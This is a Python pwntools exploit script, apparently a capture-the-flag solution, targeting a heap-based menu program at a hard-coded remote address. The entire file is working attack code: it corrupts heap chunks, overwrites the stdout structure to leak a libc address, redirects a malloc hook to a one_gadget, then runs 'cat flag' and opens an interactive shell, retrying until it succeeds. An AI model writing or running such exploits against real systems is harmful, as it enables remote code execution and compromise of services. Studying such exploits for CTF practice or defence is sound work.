from pwn import *
p = remote("139.180.216.34", "8888")
#p = process("./pwn")
#context.log_level = 'debug'


def creat(sz, idx, name):
    p.sendlineafter("\n", "1")
    p.sendlineafter(": ", str(sz))
    p.sendlineafter(": ", str(idx))
    p.sendafter("\n", name)


def creat_(sz, idx, name):
    p.sendlineafter("\n", "1")
    p.sendlineafter(": ", str(sz))
    p.sendlineafter(": ", str(idx))
    p.sendafter(":", name)


def delete(idx):
    p.sendlineafter("\n", "2")
    p.sendlineafter(":", str(idx))


def rename(idx, name):
    p.sendlineafter("\n", "3")
    p.sendlineafter(": ", str(idx))
    p.sendafter("\n", name)


while True:
    try:
        creat(0x18, 1, p64(0) + p64(0x71))
        creat(0x60, 2, 'b')
        creat(0x60, 3, 'c')
        creat(0x60, 4, 'd')
        delete(2)
        delete(3)
        rename(3, '\x10')
        creat(0x60, 2, 'e')
        creat(0x60, 3, 'f')
        rename(1, p64(0) + '\xf1')
        delete(2)
        delete(3)
        creat(0x30, 1, 'aa')
        creat(0x30, 1, 'aa')
        rename(2, '\xdd\xd5')
        creat(0x60, 5, '1')
        # rename(3, p64(0x1) * 7 + p64(0x71) + p64(target))
        creat(
            0x60, 5,
            '\x01\x02\x03' + p64(0) * 6 + p64(0xfbad3c80) + p64(0) * 3 + p8(0))
        #context.log_level = 'debug'
        p.recv(0x48)
        libc_base = u64(p.recv(6) + '\x00\x00') - 0x3c56a3
        assert (libc_base & 0xfff == 0)
        one_gadget = libc_base + 0xf1147
        target = libc_base + 0x3c4b05 - 0x18

        print "libc:" + hex(libc_base)
        print "gadget:" + hex(one_gadget)

        print "malloc to:" + hex(target)
        a = p64(0x1) * 7 + p64(0x71)  #+ p64(target)
        #context.log_level = 'debug'
        p.sendlineafter("\n", "3")
        p.sendlineafter(": ", str(3))
        p.sendafter(":", a)

        p.sendlineafter("\n", "3")
        p.sendlineafter(": ", str(2))
        p.sendafter(":", p64(0xdeadbeef) * 5 + '\x41')
        delete(1)

        #context.log_level = 'debug'
        #rename(3, p64(0x1) * 7 + p64(0x71) + p64(target))
        # gdb.attach(p)
        a = p64(0x1) * 7 + p64(0x71) + p64(target)
        p.sendlineafter("\n", "3")
        p.sendlineafter(": ", str(3))
        p.sendafter(":", a)
        #gdb.attach(p)
        creat_(0x60, 6, '1')
        creat_(0x60, 7, '123' + p64(0x1) * 2 + p64(one_gadget))
        #gdb.attach(p)
        context.log_level = 'debug'
        p.sendlineafter("\n", "1")
        p.sendlineafter(": ", str(0x10))
        p.sendlineafter(": ", str(1))
        p.sendline("cat flag")
        p.recv()
        p.interactive()
    except:
        print "Failed"
        context.log_level = 'info'
        p = remote("139.180.216.34", "8888")
        #p = process("./pwn")
